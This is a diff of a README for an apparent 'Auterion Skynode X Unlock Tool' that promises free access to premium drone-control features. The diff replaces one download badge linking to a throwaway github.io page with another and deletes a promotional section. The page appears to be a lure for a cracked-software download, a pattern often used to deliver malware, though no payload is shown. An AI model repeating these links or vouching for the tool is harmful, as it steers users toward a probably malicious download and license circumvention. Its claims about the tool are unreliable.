@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ Auterion Skynode X Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://auterion-skynode-x-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Auterion%20Skynode%20X%20Unlock%20Tool-Enable%20All%20Features-0047AB?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Auterion Skynode X Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://adrianfrenchjmqs.github.io/.github/auterion-skynode-x)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -91,13 +86,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.  
-
----
-
-## ⭐ Unlock Auterion Skynode X – Advanced Drone Control & AI Analytics
-
-Unlock all premium features of Auterion Skynode X, including **autonomous flight, AI analysis, 3D mapping, and UAS enterprise management**.  
-[Download the Unlock Tool](https://auterion-skynode-x-free-download.github.io/.github/) and expand your drone control capabilities today.  
 
 ---
 
